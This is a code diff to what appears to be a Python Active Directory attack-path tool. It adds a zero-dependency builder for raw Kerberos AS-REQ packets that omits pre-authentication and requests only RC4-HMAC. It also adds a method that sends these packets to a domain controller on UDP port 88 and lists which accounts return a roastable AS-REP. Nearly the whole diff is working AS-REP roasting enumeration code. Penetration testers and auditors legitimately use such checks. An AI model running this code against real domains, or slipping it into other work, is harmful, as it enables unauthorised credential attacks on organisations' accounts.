@@ -15,6 +15,7 @@ import ipaddress
 import logging
 import os
 import re
+import secrets
 import shlex
 import socket
 import subprocess
@@ -502,6 +503,104 @@ class NetworkMapper:
 # ACTIVE DIRECTORY ANALYZER
 # =============================================================================
 
+class KerberosPacketFactory:
+    """
+    Native Python Kerberos Packet Factory.
+    Constructs raw ASN.1/DER encoded Kerberos packets without external dependencies.
+    """
+
+    @staticmethod
+    def build_as_req(username: str, domain: str) -> bytes:
+        """
+        Builds a minimal raw AS-REQ packet for AS-REP Roasting checks.
+        
+        Structure (Simplified RFC4120):
+        AS-REQ ::= [APPLICATION 10] KDC-REQ
+        KDC-REQ ::= SEQUENCE {
+            pvno [1] INTEGER (5),
+            msg-type [2] INTEGER (10 -- AS-REQ),
+            padata [3] SEQUENCE OF PA-DATA OPTIONAL,
+            req-body [4] KDC-REQ-BODY
+        }
+        
+        This implementation constructs the byte sequence manually using struct 
+        to avoid bulky ASN.1 libraries, ensuring 'surgical' precision and zero-dependency.
+        """
+        # 1. Basic ASN.1 Encoders (Minimalist)
+        def encode_len(length):
+            if length < 128: return bytes([length])
+            else:
+                b = length.to_bytes((length.bit_length() + 7) // 8, 'big')
+                return bytes([0x80 | len(b)]) + b
+
+        def seq(tags, content):
+            l = encode_len(len(content))
+            return bytes([tags]) + l + content
+
+        def int_val(val):
+            # Integer encoding
+            b = val.to_bytes((val.bit_length() + 7) // 8 + 1, 'big', signed=True)
+            return seq(0x02, b) # 0x02 = INTEGER
+
+        def str_val(val):
+            # GeneralString encoding
+            return seq(0x1B, val.encode('utf-8'))
+
+        # 2. Build KDC-REQ-BODY
+        # cname (PrincipalName)
+        #   name-type: 1 (NT-PRINCIPAL)
+        #   name-string: SEQUENCE of username
+        name_string = seq(0x30, str_val(username))
+        cname_val = seq(0x30,
+            seq(0xA0, int_val(1)) +  # name-type
+            seq(0xA1, name_string)   # name-string
+        )
+        cname = seq(0xA0, cname_val)
+
+        # realm
+        realm = seq(0xA1, str_val(domain.upper()))
+
+        # sname (krbtgt/DOMAIN)
+        sname_strings = seq(0x30, str_val("krbtgt") + str_val(domain.upper()))
+        sname_val = seq(0x30,
+            seq(0xA0, int_val(2)) +  # name-type (NT-SRV-INST)
+            seq(0xA1, sname_strings)
+        )
+        sname = seq(0xA2, sname_val)
+
+        # till (20370913024805Z - generic future date)
+        till = seq(0xA5, seq(0x18, "20370913024805Z".encode()))
+
+        # nonce (random)
+        nonce_int = secrets.randbits(31)
+        nonce = seq(0xA6, int_val(nonce_int))
+
+        # etypes (RC4-HMAC=23) - focused on downgrade/roasting
+        # SEQUENCE OF INTEGER
+        etypes_val = seq(0x30, int_val(23))
+        etypes = seq(0xA7, etypes_val)
+
+        # KDC-REQ-BODY Sequence
+        # options: 4 (Forwardable) -> BIT STRING
+        # We skip options for minimal roast check req
+        req_body_content = seq(0xA0, int_val(0)) + cname + realm + sname + till + nonce + etypes
+        req_body = seq(0x30, req_body_content)
+
+        # 3. Build KDC-REQ
+        pvno = seq(0xA1, int_val(5))
+        msg_type = seq(0xA2, int_val(10)) # AS-REQ
+
+        # No PA-DATA (Pre-Auth Data) -> This is the key for Roasting check!
+        # If server replies with enc-part, user is vulnerable (No Pre-Auth required)
+
+        kdc_req_content = pvno + msg_type + seq(0xA4, req_body)
+        kdc_req = seq(0x30, kdc_req_content)
+
+        # 4. Wrap in APPLICATION 10
+        as_req = seq(0x6A, kdc_req)
+
+        return as_req
+
 
 class ADAnalyzer:
     """
@@ -608,8 +707,49 @@ class ADAnalyzer:
         Returns:
             List of usernames without pre-auth
         """
-        # Users with "Do not require Kerberos preauthentication" set
-        return []  # Would be populated by LDAP query
+        return []
+
+    def native_check_asrep_roasting(self, domain: str, users: List[str], dc_ip: str) -> List[str]:
+        """
+        Check for AS-REP Roasting using native Python sockets.
+        Sends raw AS-REQ without Pre-Auth.
+        
+        Args:
+            domain: Target domain
+            users: List of users to check
+            dc_ip: Domain Controller IP
+            
+        Returns:
+            List of vulnerable users (those who returned AS-REP instead of KRB-ERROR)
+        """
+        vulnerable_users = []
+
+        for user in users:
+            try:
+                # 1. Build Packet
+                packet = KerberosPacketFactory.build_as_req(user, domain)
+
+                # 2. Send to DC (UDP 88)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(2.0)
+                sock.sendto(packet, (dc_ip, 88))
+
+                # 3. Receive Response
+                data, _ = sock.recvfrom(4096)
+                sock.close()
+
+                # 4. Analyze Response
+                # AS-REP = Application 11 (0x6B)
+                # KRB-ERROR = Application 30 (0x7E)
+                if data[0] == 0x6B:
+                    # We got a Ticket! (Vulnerable)
+                    logger.warning(f"AS-REP Roasting Success: {user} is vulnerable!")
+                    vulnerable_users.append(user)
+
+            except Exception as e:
+                logger.debug(f"Roasting check failed for {user}: {e}")
+
+        return vulnerable_users
 
     def calculate_attack_path(
         self,
